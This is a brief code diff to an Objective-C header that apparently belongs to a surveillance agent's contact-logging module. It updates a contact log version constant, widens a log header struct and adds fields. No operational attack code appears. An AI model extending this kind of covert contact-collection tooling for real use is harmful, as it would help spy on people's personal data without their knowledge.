@@ -14,12 +14,15 @@
 
 #import "RCSMLogManager.h"
 
-#define	CONTACT_LOG_VERSION	0x01000000
+#define	CONTACT_LOG_VERSION     0x01000000
+#define	CONTACT_LOG_VERSION_NEW	0x01000001
 
 typedef struct _organizerAdditionalHeader{
-  u_int size;
-  u_int version;
-  u_int identifier;
+  u_int32_t size;
+  u_int32_t version;
+  u_int32_t identifier;
+  u_int32_t program;
+  u_int32_t flags;
 } organizerAdditionalHeader;
 
 enum contactType {
@@ -80,6 +83,7 @@ enum contactType {
 {
 @private
   NSMutableDictionary *mConfiguration;
+  NSInteger             mZ_Pk;
 }
 
 + (__m_MAgentOrganizer *)sharedInstance;
